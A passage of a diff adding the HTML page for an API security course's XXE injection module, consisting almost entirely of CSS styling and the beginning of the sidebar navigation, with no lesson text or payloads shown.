@@ -1,0 +1,2613 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark" data-lang="hi">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Module 11: XML External Entity (XXE) Injection - API Security Notes</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600&family=Sora:wght@400;500;600;700;800&family=Fira+Code:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="assets/css/style.css">
+
+  <style>
+    /* ==========================================================================
+       Module 11: XXE Custom Styling - Exact Universal Cyan & Deep Dark Architecture
+       ========================================================================== */
+    body {
+      background: #040814;
+      color: #f1f5f9;
+      margin: 0;
+      padding: 0;
+      overflow-x: hidden;
+      overflow-y: visible;
+      font-family: var(--font-sans);
+      font-size: 1rem;
+      line-height: 1.7;
+    }
+
+    /* Master Layout: Sidebar + Main Area */
+    .app-dashboard-layout {
+      display: flex;
+      min-height: 100vh;
+    }
+
+    /* Left Sidebar */
+    .dashboard-sidebar {
+      width: 280px;
+      background: #070d1c;
+      border-right: 1px solid rgba(255, 255, 255, 0.07);
+      flex-shrink: 0;
+      display: flex;
+      flex-direction: column;
+      height: 100vh;
+      position: sticky;
+      top: 0;
+      overflow-y: auto;
+      scrollbar-width: thin;
+      scrollbar-color: #1e293b transparent;
+    }
+
+    .sidebar-header {
+      padding: 1.5rem 1.4rem 1rem;
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .sidebar-brand-title {
+      font-family: var(--font-heading);
+      font-size: 1.25rem;
+      font-weight: 800;
+      color: #ffffff;
+      letter-spacing: -0.02em;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      line-height: 1.2;
+    }
+    .sidebar-brand-title span {
+      background: linear-gradient(135deg, #38bdf8 0%, #0284c7 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      text-shadow: 0 0 20px rgba(56, 189, 248, 0.3);
+    }
+
+    .sidebar-section-heading {
+      font-size: 0.72rem;
+      font-weight: 700;
+      color: #38bdf8;
+      padding: 0.9rem 1.4rem 0.5rem;
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .vuln-nav-list {
+      list-style: none;
+      padding: 0 0.8rem;
+      display: flex;
+      flex-direction: column;
+      gap: 4px;
+      margin: 0;
+    }
+
+    .vuln-nav-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 9px 12px;
+      border-radius: var(--radius-md);
+      color: #94a3b8;
+      text-decoration: none;
+      font-size: 0.88rem;
+      font-weight: 500;
+      transition: all 0.2s ease;
+      border: 1px solid transparent;
+    }
+    .vuln-nav-item:hover {
+      background: rgba(56, 189, 248, 0.08);
+      color: #f1f5f9;
+      border-color: rgba(56, 189, 248, 0.2);
+    }
+    .vuln-nav-item.active {
+      background: linear-gradient(135deg, rgba(56, 189, 248, 0.22), rgba(2, 132, 199, 0.35)) !important;
+      color: #f0f9ff !important;
+      border: 1px solid rgba(56, 189, 248, 0.5) !important;
+      font-weight: 600 !important;
+      box-shadow: 0 4px 16px rgba(2, 132, 199, 0.25), inset 0 0 12px rgba(56, 189, 248, 0.15) !important;
+    }
+    .vuln-nav-item.active .nav-num-badge {
+      background: rgba(56, 189, 248, 0.25) !important;
+      color: #38bdf8 !important;
+      border: 1px solid rgba(56, 189, 248, 0.6) !important;
+      font-weight: 700 !important;
+      box-shadow: 0 0 8px rgba(56, 189, 248, 0.4) !important;
+    }
+
+    .nav-num-badge {
+      font-family: var(--font-mono);
+      font-size: 0.72rem;
+      font-weight: 700;
+      padding: 2px 6px;
+      border-radius: var(--radius-sm);
+      background: rgba(255, 255, 255, 0.05);
+      color: #64748b;
+      min-width: 20px;
+      text-align: center;
+    }
+
+    /* Main Dashboard Area */
+    .dashboard-main {
+      flex: 1;
+      padding: 2rem 2.5rem 5rem;
+      overflow-y: auto;
+      max-width: 1440px;
+    }
+
+    /* Action bar at top */
+    .main-top-actionbar {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 1.5rem;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+      padding-bottom: 12px;
+    }
+
+    /* Header Hero Grid */
+    .hero-top-grid {
+      display: grid;
+      grid-template-columns: minmax(0, 1fr) 520px;
+      gap: 1.5rem;
+      margin-bottom: 1.4rem;
+      align-items: center;
+    }
+
+    @media (max-width: 1100px) {
+      .hero-top-grid {
+        grid-template-columns: 1fr;
+        gap: 1.5rem;
+      }
+    }
+
+    .category-tag-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 0.75rem;
+    }
+
+    .pill-index-tag {
+      background: #0284c7;
+      color: #fff;
+      font-size: 0.75rem;
+      font-weight: 700;
+      padding: 2px 8px;
+      border-radius: var(--radius-pill);
+      font-family: var(--font-mono);
+    }
+
+    .pill-category-name {
+      font-size: 0.78rem;
+      color: #94a3b8;
+      font-weight: 600;
+      text-transform: uppercase;
+      letter-spacing: 0.06em;
+    }
+
+    .main-vuln-h1 {
+      font-family: var(--font-heading);
+      font-size: 2.25rem;
+      font-weight: 800;
+      line-height: 1.15;
+      margin: 0 0 1rem 0;
+      color: #ffffff;
+      letter-spacing: -0.02em;
+    }
+    .main-vuln-h1 .title-blue {
+      color: #38bdf8;
+      background: linear-gradient(135deg, #38bdf8 0%, #0ea5e9 100%);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .main-vuln-desc {
+      font-size: 0.98rem;
+      color: #cbd5e1;
+      max-width: 680px;
+      line-height: 1.7;
+      margin-bottom: 1.25rem;
+    }
+
+    .meta-tags-row {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 8px;
+      margin-bottom: 1.4rem;
+    }
+
+    .meta-chip {
+      font-size: 0.76rem;
+      padding: 3px 10px;
+      border-radius: var(--radius-sm);
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-weight: 600;
+    }
+    .meta-chip.danger { background: rgba(239, 68, 68, 0.12); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.25); }
+    .meta-chip.info { background: rgba(56, 189, 248, 0.12); color: #38bdf8; border: 1px solid rgba(56, 189, 248, 0.25); }
+    .meta-chip.purple { background: rgba(168, 85, 247, 0.12); color: #c084fc; border: 1px solid rgba(168, 85, 247, 0.25); }
+
+    .quote-bubble {
+      background: rgba(15, 23, 42, 0.7);
+      border-left: 3px solid #38bdf8;
+      padding: 10px 14px;
+      border-radius: 0 var(--radius-md) var(--radius-md) 0;
+      font-size: 0.85rem;
+      color: #e2e8f0;
+      line-height: 1.6;
+      display: flex;
+      gap: 10px;
+      align-items: flex-start;
+      margin-top: 0.8rem;
+      max-width: 680px;
+      border-top: 1px solid rgba(255, 255, 255, 0.05);
+      border-right: 1px solid rgba(255, 255, 255, 0.05);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+    }
+    .quote-icon-box {
+      font-size: 1.15rem;
+      flex-shrink: 0;
+      margin-top: 1px;
+    }
+
+    /* Hero Glass Graphic (Interactive Attack Flow Simulator) */
+    .hero-glass-graphic {
+      background: linear-gradient(135deg, rgba(15, 23, 42, 0.85), rgba(7, 13, 28, 0.95));
+      border: 1px solid rgba(56, 189, 248, 0.25);
+      border-radius: var(--radius-lg);
+      padding: 1rem 1.15rem;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5), inset 0 1px 0 rgba(255, 255, 255, 0.05);
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      position: relative;
+      max-width: 520px;
+      width: 100%;
+      box-sizing: border-box;
+      margin-left: auto;
+    }
+
+    .hero-widget-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.08);
+      padding-bottom: 8px;
+    }
+
+    .hero-widget-badge {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .pulse-live-dot {
+      width: 8px;
+      height: 8px;
+      background: #ef4444;
+      border-radius: 50%;
+      box-shadow: 0 0 8px #ef4444;
+      animation: pulseAnim 2s infinite;
+    }
+
+    @keyframes pulseAnim {
+      0%, 100% { opacity: 1; transform: scale(1); }
+      50% { opacity: 0.4; transform: scale(0.85); }
+    }
+
+    .hero-badge-title {
+      font-family: var(--font-heading);
+      font-size: 0.84rem;
+      font-weight: 700;
+      color: #f1f5f9;
+      letter-spacing: 0.02em;
+    }
+
+    .hero-sim-pills {
+      display: flex;
+      gap: 6px;
+    }
+
+    .hero-sim-btn {
+      background: rgba(255, 255, 255, 0.05);
+      border: 1px solid rgba(255, 255, 255, 0.12);
+      color: #94a3b8;
+      font-size: 0.72rem;
+      font-weight: 600;
+      padding: 4px 10px;
+      border-radius: var(--radius-pill);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+      transition: all 0.2s;
+    }
+
+    .hero-sim-btn.active.exploit {
+      background: rgba(239, 68, 68, 0.2);
+      border-color: #ef4444;
+      color: #fca5a5;
+    }
+
+    .hero-sim-btn.active.safe {
+      background: rgba(16, 185, 129, 0.2);
+      border-color: #10b981;
+      color: #6ee7b7;
+    }
+
+    .hero-widget-body {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 10px;
+      width: 100%;
+      box-sizing: border-box;
+      padding: 4px 0;
+    }
+
+    .attacker-graphic-node {
+      flex: 0 0 92px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      text-align: center;
+      gap: 4px;
+    }
+
+    .attacker-avatar-circle {
+      width: 42px;
+      height: 42px;
+      border-radius: 50%;
+      background: rgba(239, 68, 68, 0.15);
+      border: 1px solid #ef4444;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.25rem;
+    }
+
+    .attacker-label {
+      font-size: 0.74rem;
+      font-weight: 700;
+      color: #fca5a5;
+      white-space: nowrap;
+    }
+    .attacker-sub {
+      font-size: 0.66rem;
+      color: #64748b;
+      white-space: nowrap;
+    }
+
+    .graphic-center-flow {
+      flex: 1 1 auto;
+      min-width: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 5px;
+      background: rgba(0, 0, 0, 0.25);
+      padding: 6px 8px;
+      border-radius: var(--radius-md);
+      border: 1px dashed rgba(255, 255, 255, 0.1);
+    }
+
+    .graphic-url-pill {
+      font-family: var(--font-mono);
+      font-size: 0.68rem;
+      background: rgba(15, 23, 42, 0.8);
+      border: 1px solid rgba(56, 189, 248, 0.3);
+      padding: 3px 6px;
+      border-radius: 4px;
+      color: #38bdf8;
+      max-width: 100%;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .graphic-swap-box {
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .swap-id-badge {
+      font-family: var(--font-mono);
+      font-size: 0.70rem;
+      font-weight: 700;
+      padding: 2px 6px;
+      border-radius: var(--radius-sm);
+      white-space: nowrap;
+    }
+    .swap-id-badge.from { background: rgba(16, 185, 129, 0.15); color: #34d399; border: 1px solid rgba(16, 185, 129, 0.3); }
+    .swap-id-badge.to { background: rgba(239, 68, 68, 0.15); color: #f87171; border: 1px solid rgba(239, 68, 68, 0.3); }
+
+    .flow-beam-track {
+      width: 100%;
+      height: 4px;
+      background: rgba(255, 255, 255, 0.08);
+      border-radius: 2px;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .flow-beam-particle {
+      position: absolute;
+      top: 0;
+      height: 100%;
+      width: 40%;
+      background: linear-gradient(90deg, transparent, #ef4444, transparent);
+      animation: flowAnim 1.8s infinite linear;
+    }
+
+    @keyframes flowAnim {
+      0% { left: -40%; }
+      100% { left: 100%; }
+    }
+
+    .flow-state-label {
+      font-size: 0.68rem;
+      font-weight: 700;
+      white-space: nowrap;
+    }
+
+    .target-profile-card {
+      flex: 0 0 150px;
+      width: 150px;
+      box-sizing: border-box;
+      background: rgba(15, 23, 42, 0.9);
+      border: 1px solid rgba(239, 68, 68, 0.4);
+      border-radius: var(--radius-md);
+      padding: 7px 9px;
+      font-size: 0.72rem;
+      color: #cbd5e1;
+      display: flex;
+      flex-direction: column;
+      gap: 3px;
+    }
+
+    .target-profile-card.exploit {
+      border-color: rgba(239, 68, 68, 0.5);
+      background: rgba(239, 68, 68, 0.05);
+    }
+    .target-profile-card.safe {
+      border-color: rgba(16, 185, 129, 0.5);
+      background: rgba(16, 185, 129, 0.05);
+    }
+
+    .target-card-top {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 2px;
+    }
+    .target-card-top h4 {
+      margin: 0;
+      font-size: 0.74rem;
+      color: #f1f5f9;
+      white-space: nowrap;
+    }
+
+    .target-pill-status {
+      font-size: 0.62rem;
+      font-weight: 700;
+      padding: 1px 5px;
+      border-radius: var(--radius-pill);
+      white-space: nowrap;
+    }
+    .target-pill-status.breach {
+      background: #ef4444;
+      color: #fff;
+    }
+    .target-pill-status.safe,
+    .target-pill-status.blocked {
+      background: #10b981;
+      color: #fff;
+    }
+
+    /* Underline Navigation Tabs Bar */
+    .tab-underline-nav {
+      display: flex;
+      align-items: center;
+      gap: 24px;
+      border-bottom: 2px solid rgba(255, 255, 255, 0.08);
+      margin-bottom: 1.8rem;
+      overflow-x: auto;
+      scrollbar-width: none;
+    }
+    .tab-underline-nav::-webkit-scrollbar {
+      display: none;
+    }
+
+    .tab-underline-btn {
+      background: none;
+      border: none;
+      color: #94a3b8;
+      font-family: var(--font-sans);
+      font-size: 0.95rem;
+      font-weight: 600;
+      padding: 12px 2px 14px 2px;
+      cursor: pointer;
+      position: relative;
+      white-space: nowrap;
+      transition: color 0.2s;
+    }
+    .tab-underline-btn:hover {
+      color: #f1f5f9;
+    }
+    .tab-underline-btn.active {
+      color: #38bdf8;
+    }
+    .tab-underline-btn.active::after {
+      content: '';
+      position: absolute;
+      bottom: -2px;
+      left: 0;
+      right: 0;
+      height: 3px;
+      background: #38bdf8;
+      box-shadow: 0 0 12px rgba(56, 189, 248, 0.8);
+      border-radius: 3px;
+    }
+
+    /* Card Panels and Structural Layout */
+    .card-panel {
+      background: #081024;
+      border: 1px solid rgba(255, 255, 255, 0.07);
+      border-radius: var(--radius-lg);
+      padding: 1.8rem 2rem;
+      margin-bottom: 1.8rem;
+    }
+
+    .card-title-badge-row {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 1.2rem;
+    }
+
+    .blue-circle-num {
+      width: 28px;
+      height: 28px;
+      border-radius: 50%;
+      background: #0284c7;
+      color: #fff;
+      font-weight: 700;
+      font-size: 0.85rem;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-family: var(--font-mono);
+      flex-shrink: 0;
+    }
+
+    .panel-header-title {
+      font-family: var(--font-heading);
+      font-size: 1.28rem;
+      font-weight: 700;
+      color: #ffffff;
+      margin: 0;
+    }
+
+    .def-lead-title {
+      font-family: var(--font-heading);
+      font-size: 1.08rem;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 0.8rem;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .content-sub-h3 {
+      font-family: var(--font-heading);
+      font-size: 1.05rem;
+      font-weight: 700;
+      color: #e2e8f0;
+      margin: 1.4rem 0 0.6rem 0;
+    }
+
+    /* Key takeaways / highlight boxes */
+    .highlight-infobox {
+      background: rgba(56, 189, 248, 0.06);
+      border-left: 3px solid #38bdf8;
+      padding: 1rem 1.2rem;
+      border-radius: 0 var(--radius-md) var(--radius-md) 0;
+      margin: 1.2rem 0;
+      font-size: 0.92rem;
+      color: #e2e8f0;
+    }
+    .highlight-infobox.danger {
+      background: rgba(239, 68, 68, 0.08);
+      border-left-color: #ef4444;
+    }
+    .highlight-infobox.warning {
+      background: rgba(245, 158, 11, 0.08);
+      border-left-color: #f59e0b;
+    }
+
+    /* Story Card / Chat Dialogues (Vikram vs Rohan) */
+    .story-card-box {
+      background: rgba(15, 23, 42, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: var(--radius-md);
+      padding: 1.4rem;
+      margin-top: 1.2rem;
+    }
+
+    .dialogue-turn {
+      display: flex;
+      gap: 14px;
+      margin-bottom: 1.2rem;
+      align-items: flex-start;
+    }
+    .dialogue-turn:last-child {
+      margin-bottom: 0;
+    }
+
+    .char-avatar {
+      width: 44px;
+      height: 44px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.4rem;
+      flex-shrink: 0;
+    }
+    .char-vikram {
+      background: rgba(56, 189, 248, 0.15);
+      border: 2px solid #38bdf8;
+      box-shadow: 0 0 12px rgba(56, 189, 248, 0.35);
+    }
+    .char-rohan {
+      background: rgba(192, 132, 252, 0.15);
+      border: 2px solid #c084fc;
+      box-shadow: 0 0 12px rgba(192, 132, 252, 0.35);
+    }
+
+    .dialogue-bubble {
+      flex: 1;
+      padding: 1rem 1.2rem;
+      border-radius: var(--radius-md);
+      font-size: 0.92rem;
+      line-height: 1.65;
+    }
+    .bubble-vikram {
+      background: rgba(15, 23, 42, 0.85);
+      border: 1px solid rgba(56, 189, 248, 0.3);
+      border-left: 4px solid #38bdf8;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+    }
+    .bubble-rohan {
+      background: rgba(24, 16, 44, 0.85);
+      border: 1px solid rgba(192, 132, 252, 0.3);
+      border-left: 4px solid #c084fc;
+      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+    }
+
+    .dialogue-header-badge {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      margin-bottom: 6px;
+    }
+    .speaker-name {
+      font-weight: 700;
+      font-size: 0.88rem;
+    }
+    .speaker-name.vikram { color: #38bdf8; }
+    .speaker-name.rohan { color: #c084fc; }
+
+    .speaker-tag {
+      font-size: 0.68rem;
+      font-weight: 700;
+      padding: 2px 7px;
+      border-radius: var(--radius-pill);
+      text-transform: uppercase;
+      letter-spacing: 0.04em;
+    }
+    .speaker-tag.vikram {
+      background: rgba(56, 189, 248, 0.18);
+      color: #7dd3fc;
+      border: 1px solid rgba(56, 189, 248, 0.35);
+    }
+    .speaker-tag.rohan {
+      background: rgba(192, 132, 252, 0.18);
+      color: #e9d5ff;
+      border: 1px solid rgba(192, 132, 252, 0.35);
+    }
+
+    /* Code Comparison Grid (Tab 4) */
+    .code-comparison-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1.5rem;
+      margin-top: 1.2rem;
+    }
+    @media (max-width: 900px) {
+      .code-comparison-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .code-col-card {
+      background: #050a17;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+    .code-col-card.vulnerable {
+      border-top: 3px solid #ef4444;
+    }
+    .code-col-card.secure {
+      border-top: 3px solid #10b981;
+    }
+
+    .code-card-header {
+      padding: 10px 14px;
+      background: rgba(255, 255, 255, 0.02);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .code-header-badge {
+      font-size: 0.72rem;
+      font-weight: 700;
+      padding: 2px 8px;
+      border-radius: var(--radius-pill);
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+    }
+    .code-header-badge.vulnerable { background: rgba(239, 68, 68, 0.2); color: #f87171; }
+    .code-header-badge.secure { background: rgba(16, 185, 129, 0.2); color: #34d399; }
+
+    .code-lang-label {
+      font-family: var(--font-mono);
+      font-size: 0.75rem;
+      color: #94a3b8;
+    }
+
+    .code-block-body {
+      padding: 14px;
+      margin: 0;
+      font-family: var(--font-mono);
+      font-size: 0.82rem;
+      line-height: 1.6;
+      background: transparent;
+      color: #e2e8f0;
+      overflow-x: auto;
+      white-space: pre;
+    }
+
+    .code-explanation-foot {
+      padding: 10px 14px;
+      background: rgba(255, 255, 255, 0.02);
+      border-top: 1px solid rgba(255, 255, 255, 0.06);
+      font-size: 0.8rem;
+      color: #94a3b8;
+      line-height: 1.5;
+    }
+
+    /* Checklist Section (Tab 5 - Exact Module 07 Parity) */
+    .checklist-meta-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 1.2rem;
+      padding: 0.8rem 1rem;
+      background: rgba(15, 23, 42, 0.6);
+      border-radius: var(--radius-md);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+    }
+    .checklist-guide-msg {
+      font-size: 0.86rem;
+      color: #cbd5e1;
+    }
+    .checklist-counter-badge {
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      background: rgba(56, 189, 248, 0.15);
+      border: 1px solid rgba(56, 189, 248, 0.4);
+      color: #38bdf8;
+      padding: 3px 10px;
+      border-radius: var(--radius-pill);
+      font-weight: 700;
+    }
+
+    .checklist-container {
+      display: flex;
+      flex-direction: column;
+      gap: 14px;
+    }
+
+    .checklist-item {
+      background: rgba(15, 23, 42, 0.5);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-radius: var(--radius-md);
+      padding: 1.2rem 1.4rem;
+      display: flex;
+      gap: 16px;
+      align-items: flex-start;
+      transition: all 0.2s ease;
+      cursor: pointer;
+    }
+    .checklist-item:hover {
+      border-color: rgba(56, 189, 248, 0.3);
+      background: rgba(15, 23, 42, 0.75);
+    }
+    .checklist-item.item-passed {
+      border-color: rgba(16, 185, 129, 0.5);
+      background: rgba(16, 185, 129, 0.04);
+    }
+    .checklist-item.item-failed {
+      border-color: rgba(239, 68, 68, 0.5);
+      background: rgba(239, 68, 68, 0.04);
+    }
+
+    .check-box-circle {
+      width: 32px;
+      height: 32px;
+      border-radius: 50%;
+      border: 2px solid rgba(255, 255, 255, 0.2);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      flex-shrink: 0;
+      margin-top: 2px;
+      cursor: pointer;
+      transition: all 0.2s;
+      font-weight: 700;
+      font-family: var(--font-mono);
+      font-size: 0.85rem;
+      color: #94a3b8;
+    }
+    .checklist-item.item-passed .check-box-circle {
+      border-color: #10b981;
+      background: #10b981;
+      color: #ffffff;
+      box-shadow: 0 0 10px rgba(16, 185, 129, 0.5);
+    }
+    .checklist-item.item-failed .check-box-circle {
+      border-color: #ef4444;
+      background: #ef4444;
+      color: #ffffff;
+      box-shadow: 0 0 10px rgba(239, 68, 68, 0.5);
+    }
+
+    .check-content {
+      flex: 1;
+    }
+    .check-content h5 {
+      margin: 0 0 4px 0;
+      font-size: 0.98rem;
+      font-family: var(--font-heading);
+      color: #ffffff;
+    }
+    .check-content p {
+      margin: 0 0 10px 0;
+      font-size: 0.86rem;
+      color: #94a3b8;
+      line-height: 1.5;
+    }
+
+    .check-how-to-box {
+      background: rgba(0, 0, 0, 0.35);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      border-radius: var(--radius-sm);
+      padding: 10px 14px;
+      margin-bottom: 10px;
+      font-size: 0.82rem;
+      color: #cbd5e1;
+      line-height: 1.6;
+    }
+    .check-how-to-title {
+      font-weight: 700;
+      color: #38bdf8;
+      margin-bottom: 4px;
+      display: flex;
+      align-items: center;
+      gap: 5px;
+    }
+
+    .check-burp-block {
+      background: #020612;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: var(--radius-sm);
+      padding: 10px 12px;
+      margin: 8px 0;
+      font-family: var(--font-mono);
+      font-size: 0.78rem;
+      color: #cbd5e1;
+      overflow-x: auto;
+      white-space: pre;
+    }
+
+    .check-actions-bar {
+      display: flex;
+      gap: 10px;
+      margin-top: 8px;
+    }
+
+    .check-status-btn {
+      padding: 4px 12px;
+      border-radius: var(--radius-pill);
+      font-size: 0.75rem;
+      font-weight: 600;
+      cursor: pointer;
+      border: 1px solid transparent;
+      background: rgba(255, 255, 255, 0.05);
+      color: #94a3b8;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s;
+    }
+    .check-status-btn.pass-btn:hover,
+    .check-status-btn.pass-btn.active {
+      background: rgba(16, 185, 129, 0.2);
+      border-color: #10b981;
+      color: #34d399;
+    }
+    .check-status-btn.fail-btn:hover,
+    .check-status-btn.fail-btn.active {
+      background: rgba(239, 68, 68, 0.2);
+      border-color: #ef4444;
+      color: #f87171;
+    }
+
+    /* Live Lab Simulator (Tab 6) */
+    .lab-container-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1.5rem;
+      margin-top: 1.2rem;
+    }
+    @media (max-width: 960px) {
+      .lab-container-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .lab-editor-card {
+      background: #020612;
+      border: 1px solid rgba(255, 255, 255, 0.08);
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      display: flex;
+      flex-direction: column;
+    }
+    .lab-editor-header {
+      padding: 10px 14px;
+      background: rgba(255, 255, 255, 0.03);
+      border-bottom: 1px solid rgba(255, 255, 255, 0.06);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .lab-preset-selector {
+      background: rgba(15, 23, 42, 0.8);
+      border: 1px solid rgba(56, 189, 248, 0.3);
+      color: #38bdf8;
+      padding: 4px 8px;
+      border-radius: var(--radius-sm);
+      font-size: 0.75rem;
+      outline: none;
+    }
+
+    .lab-xml-input {
+      width: 100%;
+      height: 240px;
+      background: transparent;
+      border: none;
+      padding: 12px 14px;
+      font-family: var(--font-mono);
+      font-size: 0.82rem;
+      color: #f1f5f9;
+      resize: vertical;
+      outline: none;
+      box-sizing: border-box;
+      line-height: 1.5;
+    }
+
+    .lab-actions-bar {
+      padding: 10px 14px;
+      background: rgba(255, 255, 255, 0.02);
+      border-top: 1px solid rgba(255, 255, 255, 0.06);
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .btn-parse-trigger {
+      background: linear-gradient(135deg, #0284c7, #0369a1);
+      color: #fff;
+      border: none;
+      padding: 6px 16px;
+      border-radius: var(--radius-sm);
+      font-size: 0.82rem;
+      font-weight: 700;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      transition: all 0.2s;
+    }
+    .btn-parse-trigger:hover {
+      background: linear-gradient(135deg, #0ea5e9, #0284c7);
+      box-shadow: 0 0 12px rgba(56, 189, 248, 0.4);
+    }
+
+    .lab-output-terminal {
+      padding: 14px;
+      font-family: var(--font-mono);
+      font-size: 0.82rem;
+      line-height: 1.6;
+      color: #cbd5e1;
+      height: 240px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+    }
+
+    /* FAQ Styles (Tab 7) */
+    .faq-accordion-group {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+      margin-top: 1.2rem;
+    }
+    .faq-item {
+      background: rgba(15, 23, 42, 0.6);
+      border: 1px solid rgba(255, 255, 255, 0.06);
+      border-radius: var(--radius-md);
+      overflow: hidden;
+      transition: all 0.2s;
+    }
+    .faq-question {
+      padding: 14px 18px;
+      cursor: pointer;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      font-weight: 600;
+      font-size: 0.95rem;
+      color: #ffffff;
+      user-select: none;
+    }
+    .faq-question:hover {
+      color: #38bdf8;
+    }
+    .faq-icon {
+      transition: transform 0.2s ease;
+      color: #38bdf8;
+    }
+    .faq-item.active .faq-icon {
+      transform: rotate(180deg);
+    }
+    .faq-answer {
+      display: none;
+      padding: 0 18px 16px 18px;
+      font-size: 0.88rem;
+      color: #94a3b8;
+      line-height: 1.65;
+      border-top: 1px solid rgba(255, 255, 255, 0.04);
+      margin-top: 4px;
+      padding-top: 12px;
+    }
+    .faq-item.active .faq-answer {
+      display: block;
+    }
+
+    /* Language Toggle Visibility */
+    html[data-lang="hi"] .lang-en { display: none !important; }
+    html[data-lang="en"] .lang-hi { display: none !important; }
+
+    /* Tab Content Visibility */
+    .tab-content {
+      display: none;
+    }
+    .tab-content.active {
+      display: block;
+      animation: fadeIn 0.25s ease-out;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(6px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+  </style>
+</head>
+<body>
+
+  <div class="app-dashboard-layout">
+
+    <!-- ====================================================================
+         LEFT SIDEBAR NAVIGATION
+         ==================================================================== -->
+    <aside class="dashboard-sidebar">
+      <div class="sidebar-header">
+        <a href="index.html" class="sidebar-brand-title">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#38bdf8" stroke-width="2.5"><path d="M12 2L3 7v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V7l-9-5z"/></svg>
+          API <span>SECURITY</span>
+        </a>
+      </div>
+
+      <div class="sidebar-section-heading">Foundations</div>
+      <ul class="vuln-nav-list">
+        <li><a href="api-intro.html" class="vuln-nav-item"><span class="nav-num-badge">00</span> API Fundamentals</a></li>
+      </ul>
+
+      <div class="sidebar-section-heading">Common Vulnerabilities</div>
+      <ul class="vuln-nav-list">
+        <li><a href="bola.html" class="vuln-nav-item"><span class="nav-num-badge">01</span> BOLA</a></li>
+        <li><a href="bfla.html" class="vuln-nav-item"><span class="nav-num-badge">02</span> BFLA</a></li>
+        <li><a href="idor.html" class="vuln-nav-item"><span class="nav-num-badge">03</span> IDOR</a></li>
+        <li><a href="jwt.html" class="vuln-nav-item"><span class="nav-num-badge">04</span> JWT Vulnerabilities</a></li>
+        <li><a href="mass-assignment.html" class="vuln-nav-item"><span class="nav-num-badge">05</span> Mass Assignment</a></li>
